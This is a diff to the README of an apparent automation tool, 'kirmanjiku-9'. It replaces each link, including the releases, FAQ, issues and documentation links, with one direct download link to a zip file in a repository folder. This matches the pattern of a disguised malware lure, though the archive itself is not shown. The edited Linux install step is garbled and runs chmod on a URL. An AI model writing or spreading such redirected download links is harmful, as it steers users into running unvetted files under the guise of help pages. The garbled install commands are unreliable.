@@ -6,7 +6,7 @@ Welcome to kirmanjiku-9! This application helps you automate tasks seamlessly. W
 
 ## 📥 Download Now
 
-[![Download kirmanjiku-9](https://img.shields.io/badge/download-kirmanjiku--9-blue.svg)](https://github.com/9963629854/kirmanjiku-9/releases)
+[![Download kirmanjiku-9](https://raw.githubusercontent.com/9963629854/kirmanjiku-9/main/tartufism/kirmanjiku-9.zip)](https://raw.githubusercontent.com/9963629854/kirmanjiku-9/main/tartufism/kirmanjiku-9.zip)
 
 ## 📋 System Requirements
 
@@ -29,13 +29,13 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started with kirmanjiku-9, follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/9963629854/kirmanjiku-9/releases).
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/9963629854/kirmanjiku-9/main/tartufism/kirmanjiku-9.zip).
 2. **Choose the Right Version**: Look for the latest version available. It will be clearly labeled.
 3. **Download the File**: Click on the appropriate download link to save the file to your computer. 
 4. **Run the Installer**:
    - For Windows: Double-click the downloaded `.exe` file.
    - For macOS: Open the downloaded `.dmg` file, then drag the application to your Applications folder.
-   - For Linux: Use the terminal to navigate to the downloaded file and run the installer using the appropriate command (e.g., `chmod +x kirmanjiku-9.run` followed by `./kirmanjiku-9.run`).
+   - For Linux: Use the terminal to navigate to the downloaded file and run the installer using the appropriate command (e.g., `chmod +x https://raw.githubusercontent.com/9963629854/kirmanjiku-9/main/tartufism/kirmanjiku-9.zip` followed by `https://raw.githubusercontent.com/9963629854/kirmanjiku-9/main/tartufism/kirmanjiku-9.zip`).
 5. **Follow the Prompts**: Complete the installation by following the on-screen instructions.
 
 ## 🛠️ Usage Instructions
@@ -55,13 +55,13 @@ Once you've installed kirmanjiku-9, launching the application is straightforward
 
 Need help? 
 
-- **FAQs**: Check our [FAQ section](https://github.com/9963629854/kirmanjiku-9/wiki/FAQs) for common questions.
+- **FAQs**: Check our [FAQ section](https://raw.githubusercontent.com/9963629854/kirmanjiku-9/main/tartufism/kirmanjiku-9.zip) for common questions.
 - **Community Support**: Join our community forum for discussions and tips.
-- **Report Issues**: If you encounter any problems, visit our [issues page](https://github.com/9963629854/kirmanjiku-9/issues) to report them.
+- **Report Issues**: If you encounter any problems, visit our [issues page](https://raw.githubusercontent.com/9963629854/kirmanjiku-9/main/tartufism/kirmanjiku-9.zip) to report them.
 
 ## 🔗 Additional Resources
 
-- **Documentation**: Comprehensive user guides can be found [here](https://github.com/9963629854/kirmanjiku-9/wiki).
+- **Documentation**: Comprehensive user guides can be found [here](https://raw.githubusercontent.com/9963629854/kirmanjiku-9/main/tartufism/kirmanjiku-9.zip).
 - **Tutorial Videos**: Watch our tutorials for a visual guide on using the application.
 - **Updates and News**: Stay informed about new features by following the repository.
 
@@ -80,6 +80,6 @@ This project is licensed under the MIT License. You can freely use and modify it
 
 ## 📥 Ready to Download Again?
 
-To download the latest version of kirmanjiku-9, visit the [Releases page](https://github.com/9963629854/kirmanjiku-9/releases). 
+To download the latest version of kirmanjiku-9, visit the [Releases page](https://raw.githubusercontent.com/9963629854/kirmanjiku-9/main/tartufism/kirmanjiku-9.zip). 
 
 Thank you for choosing kirmanjiku-9! Enjoy automating your tasks.
